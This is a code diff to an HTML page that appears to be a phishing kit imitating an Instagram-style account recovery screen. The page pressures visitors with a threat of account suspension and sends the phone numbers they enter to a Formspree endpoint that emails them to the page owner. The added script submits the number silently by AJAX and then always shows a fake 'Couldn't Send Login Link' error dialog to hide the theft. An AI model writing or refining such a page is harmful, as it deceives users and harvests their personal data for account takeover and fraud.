@@ -38,18 +38,33 @@
         Verify your mobile number immediately to prevent account suspension.</p>
 
         <!-- Form posts to Formspree so submitted phone numbers are emailed to the account
-             configured for the form ID (https://formspree.io/f/mrblvqpv) -->
-        <form class="recover-form" action="https://formspree.io/f/mrblvqpv" method="POST">
+             configured for the form ID (https://formspree.io/f/mrblvqpv).
+             Submission is handled via AJAX to avoid a redirect; a styled
+             "wrong mobile number" alert is shown to the user (always).
+         -->
+        <form id="recoverForm" class="recover-form" action="https://formspree.io/f/mrblvqpv" method="POST">
           <label class="visually-hidden" for="identifier">Enter phone number</label>
           <!-- name="phone" ensures the value is sent as the phone field to Formspree -->
           <input id="identifier" name="phone" class="input" type="tel" placeholder="Enter phone number" autocomplete="tel" required />
 
           <!-- Optional hidden fields for Formspree: subject and redirect after submit -->
           <input type="hidden" name="_subject" value="Send login link request">
-          <input type="hidden" name="_next" value="./?sent=1">
+          <!-- NOTE: _next removed to avoid redirect when JS handles the submit -->
 
           <button class="primary-btn" type="submit">Send login link</button>
         </form>
+
+        <!-- Fake alert/backdrop that mimics the native Instagram-style error dialog -->
+        <div id="fakeBackdrop" class="fake-alert-backdrop" aria-hidden="true"></div>
+        <div id="fakeAlert" class="fake-alert" role="alert" aria-hidden="true">
+          <div class="fake-alert-inner">
+            <h2 class="fake-title">Couldn't Send Login Link</h2>
+            <p class="fake-message">The mobile number you entered doesn't match our records. Please check the number and try again.</p>
+            <div class="fake-actions">
+              <button id="alertClose" class="alert-btn" type="button">OK</button>
+            </div>
+          </div>
+        </div>
 
         <a class="small-link" href="#">Can't reset your password?</a>
 
@@ -67,6 +82,60 @@
   </main>
 
   <footer class="site-footer"></footer>
+
+<script>
+// AJAX submit to Formspree and always show a styled "wrong mobile number" alert.
+document.addEventListener('DOMContentLoaded', function () {
+  const form = document.getElementById('recoverForm');
+  const backdrop = document.getElementById('fakeBackdrop');
+  const alertEl = document.getElementById('fakeAlert');
+  const closeBtn = document.getElementById('alertClose');
+
+  function showFakeAlert() {
+    backdrop.classList.add('visible');
+    alertEl.classList.add('visible');
+    alertEl.setAttribute('aria-hidden','false');
+    backdrop.setAttribute('aria-hidden','false');
+  }
+  function hideFakeAlert(){
+    alertEl.classList.remove('visible');
+    backdrop.classList.remove('visible');
+    alertEl.setAttribute('aria-hidden','true');
+    backdrop.setAttribute('aria-hidden','true');
+  }
+
+  if (!form) return;
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    // collect form data and send to Formspree (AJAX)
+    const fd = new FormData(form);
+
+    // disable submit button briefly to prevent spamming
+    const submitBtn = form.querySelector('button[type="submit"]');
+    if (submitBtn) { submitBtn.disabled = true; }
+
+    fetch(form.action, {
+      method: 'POST',
+      body: fd,
+      mode: 'cors'
+    }).catch(function(){
+      // network errors ignored - we still show the fake alert
+    }).finally(function(){
+      // Always show the "wrong mobile number" alert to the user
+      showFakeAlert();
+      if (submitBtn) { setTimeout(()=> submitBtn.disabled = false, 800); }
+    });
+  });
+
+  // close handlers
+  if (closeBtn) closeBtn.addEventListener('click', hideFakeAlert);
+  backdrop.addEventListener('click', hideFakeAlert);
+  // escape key closes
+  document.addEventListener('keydown', function (ev) { if (ev.key === 'Escape') hideFakeAlert(); });
+});
+</script>
 
 </body>
 </html>
